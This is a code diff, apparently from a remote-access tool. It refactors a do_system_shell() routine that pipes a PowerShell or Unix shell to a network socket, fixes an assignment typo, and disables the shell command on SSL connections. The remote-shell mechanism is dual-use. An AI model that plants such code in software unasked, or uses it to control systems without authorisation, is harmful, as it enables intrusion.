@@ -35,9 +35,8 @@
 
 #include "common.h"
 #include "parser.h"
-
-#include "common.h"
-#include "parser.h"
+#include "tcp.h"
+#include "stream.h"
 
 #include "shell.h"
 
@@ -70,6 +69,16 @@ void do_system_shell(Parser *p)
     SECURITY_ATTRIBUTES sa;
     PROCESS_INFORMATION pi;
     STARTUPINFO si;
+
+    // Disable this command if SSL is enabled.
+    // This is tricky to implement so I'm leaving it for later.
+#ifndef TICK_FEATURES_NO_CRYPTO
+    if (p->use_ssl) {
+        LOG("TODO implement do_system_shell() on SSL connections\n");
+        parser_error(p, "operation not yet supported on encrypted connections");
+        return;
+    }
+#endif
 
     // Search for PowerShell. If it is available, that will be our remote shell.
     // Note that the path to *all* versions of PowerShell is always the same.
@@ -130,7 +139,7 @@ void do_system_shell(Parser *p)
     memset(&sa, 0, sizeof(sa));
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor - NULL;
+    sa.lpSecurityDescriptor = NULL;
     success |= CreatePipe(&readStdIn, &writeStdIn, &sa, 0);
     success |= CreatePipe(&readStdOut, &writeStdOut, &sa, 0);
     success |= SetHandleInformation(writeStdIn, HANDLE_FLAG_INHERIT, 0);
@@ -219,66 +228,6 @@ void do_system_shell(Parser *p)
     LOG("Launched remote shell: %s\n", shell);
 }
 
-// Helper function to copy a stream from a socket to a pipe.
-int copy_stream_socket_to_pipe(int sock, HANDLE pipe, ssize_t count)
-{
-    ssize_t copied = 0;
-    ssize_t block = 0;
-    char buffer[1024];
-
-    if (count == 0) return 0;
-    while (count < 0 || copied < count) {
-        block = (ssize_t) recv(sock, buffer, sizeof(buffer), 0);
-        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
-            return -1;
-        }
-        if (block == 0) {
-            return 0;
-        }
-        copied = copied + block;
-        while (block > 0) {
-            DWORD tmp = 0;
-            if ( ! WriteFile(pipe, buffer, block, &tmp, NULL) ) {
-                return -1;
-            }
-            block = block - tmp;
-        }
-    }
-    return 0;
-}
-
-// Helper function to copy a stream from a pipe to a socket.
-int copy_stream_pipe_to_socket(HANDLE pipe, int sock, ssize_t count)
-{
-    ssize_t copied = 0;
-    ssize_t block = 0;
-    char buffer[1024];
-
-    if (count == 0) return 0;
-    while (count < 0 || copied < count) {
-        DWORD tmp = 0;
-        if ( ! ReadFile(pipe, buffer, sizeof(buffer), &tmp, NULL) ) {
-            return -1;
-        }
-        block = tmp;
-        if (block == 0 && count > 0 && copied < count) {
-            return -1;
-        }
-        if (block == 0) {
-            return 0;
-        }
-        copied = copied + block;
-        while (block > 0) {
-            ssize_t tmp = (ssize_t) send(sock, buffer, block, 0);
-            if (tmp <= 0) {
-                return -1;
-            }
-            block = block - tmp;
-        }
-    }
-    return 0;
-}
-
 // This function runs in a background thread.
 DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
 {
@@ -289,7 +238,7 @@ DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
     HeapFree(GetProcessHeap(), 0, lpParam);
 
     // Copy the stream.
-    copy_stream_pipe_to_socket(pipe, sock, -1);
+    copy_stream(pipe, STREAM_HANDLE, sock, STREAM_SOCKET, -1);
 
     // Close all the handles and exit.
     shutdown(sock, 2);
@@ -308,7 +257,7 @@ DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam)
     HeapFree(GetProcessHeap(), 0, lpParam);
 
     // Copy the stream.
-    copy_stream_socket_to_pipe(sock, pipe, -1);
+    copy_stream(sock, STREAM_SOCKET, pipe, STREAM_HANDLE, -1);
 
     // Close all the handles and exit.
     shutdown(sock, 2);
@@ -325,6 +274,16 @@ void do_system_shell(Parser *p)
 {
     char *shell = NULL;
     char *argv[2];
+
+    // Disable this command if SSL is enabled.
+    // This is tricky to implement so I'm leaving it for later.
+#ifndef TICK_FEATURES_NO_CRYPTO
+    if (p->use_ssl) {
+        LOG("TODO implement do_system_shell() on SSL connections\n");
+        parser_error(p, "operation not yet supported on encrypted connections");
+        return;
+    }
+#endif
 
     // Find out what our shell is.
     shell = getenv("SHELL");
